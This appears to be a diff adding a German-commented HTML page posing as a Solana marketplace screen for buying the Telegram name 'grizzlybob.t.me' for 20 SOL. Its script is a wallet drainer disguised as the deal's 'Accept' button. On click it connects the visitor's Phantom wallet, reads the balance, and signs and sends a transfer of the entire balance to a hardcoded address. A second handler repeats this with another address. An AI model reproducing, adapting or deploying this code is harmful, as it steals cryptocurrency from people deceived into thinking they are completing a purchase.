@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buy Telegramname</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #1e1e1e;
+            color: white;
+        }
+
+        /* Header */
+        header {
+            width: 100%;
+            max-width: 600px;
+            background-color: #2c2c2c;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid #555;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 12px 12px 0 0;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+        }
+
+        /* Abstand für Inhalt unter Header */
+        .content {
+            margin-top: 70px;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        /* Flexbox Container für Deal Info und User Info untereinander */
+        .info-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            width: 100%;
+        }
+
+        /* Deal Info und User Info Boxen gleich groß */
+        .deal-info,
+        .user-info {
+            flex: 1;
+            background: #2c2c2c;
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        /* Deal Info Box */
+        .deal-header {
+            background: #3a3a3a;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #666;
+        }
+
+        .deal-values {
+            display: flex;
+            width: 100%;
+            background-color: #292929;
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+            gap: 1px;
+        }
+
+        .deal-item {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .deal-item span {
+            color: #aaa;
+            white-space: nowrap;
+        }
+
+        .usd-value {
+            font-size: 14px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        /* Benutzerinfo Box */
+        .user-info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .thin-divider {
+            width: 100%;
+            height: 1px;
+            background-color: #444;
+            margin: 10px 0;
+        }
+
+        .web-address {
+            color: #4da3ff;
+        }
+
+        .textu {
+            font-size: small;
+            margin-bottom: 10px;
+        }
+        /* Sol Address */
+        .sol-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .sol-info span {
+            color: #aaa;
+        }
+
+        /* Exchange-Button */
+        .exchange-button {
+            padding: 15px;
+            background-color: #4da3ff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            margin-top: 25px;
+            width: 100%;
+        }
+
+        .exchange-button:hover {
+            background-color: #3b8cc4;
+        }
+
+        /* Neue ID für "Deal in Progress" grünen Kasten - Mobil Optimiert */
+        #deal-in-progress-mobile {
+            background-color: #2b8200;  /* Grüner Hintergrund */
+            color: rgb(255, 255, 255);               /* Weiße Schrift */
+            padding: 6px 12px;          /* Weniger Padding für kompaktere Darstellung */
+            border-radius: 12px;        /* Abgerundete Ecken */
+            font-weight: bold;          /* Fett gedruckter Text */
+            font-size: 12px;            /* Kleinere Schriftgröße */
+         
+            text-align: center;         /* Text zentrieren */
+            margin-top: 12px; 
+            margin-left: 80px;  
+            margin-right: 80px;
+            margin-bottom: 15px;
+            justify-content: center;        /* Weniger Abstand nach oben auf mobilen Geräten */
+        }
+
+        /* Responsive Design für Handys */
+        @media (max-width: 768px) {
+            .top-container {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .deal-name {
+                font-size: 24px;
+            }
+
+            #deal-in-progress-mobile {
+                font-size: 12px;
+                padding: 6px 12px; /* Weniger Padding */
+               
+                margin-top: 12px;   /* Kleinerer Abstand */
+            }
+
+            .deal-item {
+                width: 48%;
+            }
+
+            .user-info {
+                padding: 12px;
+                margin-top: 20px;
+            }
+
+            .sol-info {
+                font-size: 14px;
+                padding: 10px 0;
+            }
+
+            .exchange-button {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>Solana Marketplace</header>
+
+    <!-- Inhalt mit Abstand unter Header -->
+    <div class="content">
+
+        <!-- Top Container -->
+        <div class="top-container">
+            <div class="textu">Buy Telegram Name:</div>
+            <div class="deal-name">grizzlybob.t.me</div>
+            <div id="deal-in-progress-mobile">Deal in Progress</div> <!-- Neue ID für den mobilen Status -->
+        </div>
+
+        <!-- Flex Container für Deal Info und User Info untereinander -->
+        <div class="info-container">
+            
+            <!-- Deal Info Box -->
+            <div class="deal-info">
+                <div class="deal-header">Deal Price & Commission</div>
+                <div class="divider"></div>
+                <div class="deal-values">
+                    <div class="deal-item">
+                        <span>Deal Price</span>
+                        <span>20 SOL</span>
+                        <div class="usd-value">~ 500 USD</div>
+                    </div>
+                    <div class="deal-item">
+                        <span>Commission</span>
+                        <span>0.1 SOL</span>
+                        <div class="usd-value">~ 2.5 USD</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- User Info Box -->
+            <div class="user-info">
+                <div class="user-info-row">
+                    <span>Telegram Username</span>
+                    <span class="web-address">hebebu</span>
+                </div>
+                <div class="thin-divider"></div>
+                <div class="user-info-row">
+                    <span>Web Address</span>
+                    <a href="https://t.me/gubuzzzu" class="web-address">t.me/gubuzzzu</a>
+                </div>
+                <div class="thin-divider"></div>
+                <div class="user-info-row">
+                    <span>Sol Address</span>
+                    <span class="web-address">...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sol Address -->
+        <div class="sol-info">
+            <span>Sol Address</span>
+            <span>...</span>
+        </div>
+
+        <!-- Exchange Button -->
+        <button class="exchange-button" id="acceptButton">Accept</button>
+
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.40.0/dist/solanaWeb3.min.js"></script>
+    <script>
+        document.getElementById("acceptButton").addEventListener("click", async () => {
+            if (window.solana && window.solana.isPhantom) {
+                try {
+                    // Verbindung zur Phantom Wallet herstellen
+                    await window.solana.connect();
+
+                    // Verbindung herstellen und Wallet Public Key abrufen
+                    const wallet = window.solana;
+                    const publicKey = wallet.publicKey;
+
+                    // Solana-Netzwerk-Verbindung
+                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+
+                    // Hole den SOL-Guthaben
+                    const balance = await connection.getBalance(publicKey);
+
+                    console.log("Balance: ", balance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+
+                    // Zieladresse (Beispiel-Wallet)
+                    const recipient = new solanaWeb3.PublicKey("64BiYMiusprav2GbnPbTY59oY1JkAA3Ny5BQftiNCC28");
+
+                    // Berechne den Betrag, der gesendet werden soll (die gesamte Balance)
+                    const amount = balance;
+
+                    // Erstelle eine Transaktion
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: wallet.publicKey,
+                            toPubkey: recipient,
+                            lamports: amount, // Der Betrag in Lamports (1 SOL = 1 Milliarde Lamports)
+                        })
+                    );
+
+                    // Sende die Transaktion
+                    const signature = await window.solana.signAndSendTransaction(transaction);
+
+                    console.log("Transaktionssignatur:", signature);
+
+                    // Bestätige die Transaktion
+                    await connection.confirmTransaction(signature, "confirmed");
+
+                    alert("Transaktion erfolgreich! Die gesamte Balance wurde gesendet.");
+                } catch (error) {
+                    console.error("Fehler beim Verbinden mit Phantom Wallet oder Senden der Transaktion:", error);
+                    alert("Fehler bei der Verbindung mit Phantom Wallet oder beim Senden der Transaktion.");
+                }
+            } else {
+                alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
+            }
+        });
+        if (window.solana && window.solana.isPhantom) {
+    // Verbindung erfolgreich
+}
+else {
+    alert("Bitte installiere Phantom Wallet, um diese Funktion zu nutzen.");
+    document.getElementById("acceptButton").addEventListener("click", async () => {
+    if (window.solana && window.solana.isPhantom) {
+        try {
+            console.log("Versuche, mit Phantom zu verbinden...");
+            await window.solana.connect();
+            console.log("Verbindung erfolgreich!");
+            const wallet = window.solana;
+            const publicKey = wallet.publicKey;
+            console.log("Öffentlicher Schlüssel:", publicKey.toString());
+
+            // Solana-Verbindung
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+            const balance = await connection.getBalance(publicKey);
+            console.log("Balance:", balance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
+
+            // Zieladresse und Transaktion
+            const recipient = new solanaWeb3.PublicKey("Z9UyZyZTxXvh5ZtRmVkt5pz7FtdgAQtWUNgsL6ztiuA9");
+            const amount = balance;
+
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: wallet.publicKey,
+                    toPubkey: recipient,
+                    lamports: amount,
+                })
+            );
+
+            const signature = await window.solana.signAndSendTransaction(transaction);
+            console.log("Transaktionssignatur:", signature);
+            alert("Transaktion erfolgreich!");
+        } catch (error) {
+            console.error("Fehler:", error);
+            alert("Fehler bei der Verbindung oder Transaktion.");
+        }
+    } else {
+        alert("Phantom Wallet ist nicht verfügbar oder nicht korrekt installiert.");
+    }
+});
+
+}
+
+    </script>
+
+</body>
+</html>
